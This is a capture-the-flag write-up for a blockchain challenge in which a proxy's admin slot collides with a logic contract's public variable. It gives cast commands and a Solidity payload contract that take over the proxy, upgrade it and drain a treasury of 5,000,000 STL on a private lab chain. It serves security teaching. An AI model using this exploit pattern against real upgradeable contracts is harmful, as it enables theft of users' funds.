# Quiet Upgrade

Quiet Upgrade is a blockchain challenge worth 64 points (209 solves). A settlement node keeps its ledger logic behind an upgradeable proxy, and the upgrade path was added in a later release without anyone checking the logic contract's storage against the proxy's. Each team gets a private chain, the Solidity sources for everything deployed, an RPC URL, a funded key and the `Setup` address. The win condition is that the treasury ends below 1% of its 5,000,000 STL starting reserve.

## What you are given

`quiet-upgrade.zip` unpacks to seven Solidity files under `contracts/`:

```
Setup.sol             deploys the instance, funds the treasury, exposes isSolved()
SettlementProxy.sol   minimal delegatecall proxy with the upgrade path
SettlementV1.sol      the ledger logic, always reached through the proxy
Treasury.sol          holds the 5,000,000 STL and releases only to the wired system
ERC20Base.sol         minimal token
SettlementToken.sol   the STL token
Ops.sol               the proxy's original admin, with no callable state change
```

The portal supplies `<rpc-url>`, `<player-key>` and the `<setup-address>`. The instance reports chain id 31337, and `eth_accounts` on it is empty, so the handed-out player key is the only signer available.

## Reproduction

1. Read the two slot tables and put them side by side. The proxy declares its pointers as ordinary sequential storage:

   ```
   SettlementProxy  slot 0  admin
                    slot 1  implementation
   SettlementV1     slot 0  branchOperator
                    slot 1  branchRegistrar
                    slot 2  branchClaimed
   ```

   Because `SettlementV1` is only ever reached by `delegatecall` from the proxy, its variables land in the proxy's storage. `branchOperator` and `admin` are the same word.

2. Confirm the layout from outside, and read the baseline. `Setup` exposes the system addresses as immutables, and the proxy exposes `admin()` as an ordinary public variable getter.

   ```
   $ cast call <setup-address> "proxy()(address)"            --rpc-url <rpc-url>
   $ cast call <setup-address> "treasury()(address)"         --rpc-url <rpc-url>
   $ cast call <proxy>         "admin()(address)"            --rpc-url <rpc-url>
   $ cast call <setup-address> "isSolved()(bool)"            --rpc-url <rpc-url>
   $ cast call <treasury>      "reserveBalance()(uint256)"   --rpc-url <rpc-url>
   ```

   `admin()` returns the `Ops` address, never the player. `isSolved()` returns false, and `reserveBalance()` returns `5000000000000000000000000` (5,000,000 STL at 18 decimals).

3. Take the admin slot through the logic contract. `registerBranch(address operator)` is public, needs no registrar (the comment in the source notes that `branchRegistrar` is never assigned), and writes its argument into slot 0:

   ```
   $ cast send <proxy> "registerBranch(address)" <player> \
       --rpc-url <rpc-url> --private-key <player-key>
   $ cast call <proxy> "admin()(address)" --rpc-url <rpc-url>
   ```

   The second call now returns `<player>`. A one-time `branchClaimed[msg.sender]` guard stops a repeat, but one write is all that is needed.

4. Build the replacement implementation. `upgradeTo` refuses a candidate unless `proxiableSlot()` returns a value bound to this specific proxy, so the payload computes that hash from the proxy address in its constructor and releases the reserve from its other entry point. It needs one interface, `IQuietTreasury`, with `release(address,uint256)`:

   ```solidity
   contract UpgradePayload {
       bytes32 private constant QU_TAG = keccak256("quiet-upgrade.proxiable");
       bytes32 private immutable _slot; IQuietTreasury private immutable _t;
       address private immutable _to;   uint256 private immutable _amt;
       constructor(address proxy, address treasury, address to, uint256 amt) {
           _slot = keccak256(abi.encodePacked(QU_TAG, proxy));
           _t = IQuietTreasury(treasury); _to = to; _amt = amt;
       }
       function proxiableSlot() external view returns (bytes32) { return _slot; }
       function drain() external { _t.release(_to, _amt); }
   }
   ```

5. Install it and check it took.

   ```
   $ cast send <proxy> "upgradeTo(address)" <payload> \
       --rpc-url <rpc-url> --private-key <player-key>
   $ cast call <proxy> "implementation()(address)" --rpc-url <rpc-url>
   ```

   The proxy's own `upgradeTo` is not delegated, so it runs with `address(this)` equal to the proxy and the expected hash matches the payload's immutable.

6. Trigger the fallback. The proxy has no `drain()` of its own, so the call goes through its fallback into the payload, whose code runs in the proxy's execution context. Its external call to `Treasury.release` therefore has `msg.sender == <proxy>`, which is exactly the address `Setup` wired at deployment.

   ```
   $ cast send <proxy> "drain()" --rpc-url <rpc-url> --private-key <player-key>
   $ cast call <treasury> "reserveBalance()(uint256)" --rpc-url <rpc-url>
   0
   ```

   Releasing the full 5,000,000 STL to the player is enough; the threshold is 50,000 STL, so anything above 4,950,000 works.

7. Read the win flag. `Setup.isSolved()` now returns true, and the instance endpoint returns the challenge flag. Submission went through the checker, and the accepted record for this challenge reports the sequence above ending at `GET /flag`.

## Why it works

The proxy stores its admin and implementation pointers in slots 0 and 1, which is the layout an EIP-1967 proxy exists to avoid. The logic contract happens to declare an attacker-writable address as its first variable, so an ordinary business call in the logic, `registerBranch`, overwrites the proxy's admin. Nothing about that call looks privileged: it is a public onboarding function with a one-per-caller guard.

Once the player is admin, the only remaining obstacle is the check in `upgradeTo` that the candidate was built for this proxy. That check proves intent, not safety: a candidate written for the target proxy can return the expected hash trivially, so it keeps out copy-pasted implementations from other instances and nothing else.

The last step depends on `Treasury` trusting an address rather than a caller identity. `release` requires `msg.sender == settlementSystem`, and delegatecall runs the payload's code as the proxy, so the payload borrows the proxy's authorisation without ever holding it.

The slot-1 collision is a deliberate dead end. `branchRegistrar` is never written by any function in `SettlementV1`, so the implementation pointer cannot be overwritten directly and the takeover has to go through the admin slot and `upgradeTo`.

The local record of the run includes a static analysis pass that is careful about what it had not proved: at that point `cast` and `web3` were not installed, the team's instance limit blocked a fresh start, `instance-status` carried no `Setup` address or key, and no transaction had been sent during that pass. The accepted solve used the start payload and a hand-built JSON-RPC client with `eth_account`, so the commands above are transcriptions of the same calls rather than the exact ones that ran. Individual transaction hashes for this challenge are not recorded locally, so none are quoted here.

## Flag

```
hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_88af2caaf5}
```
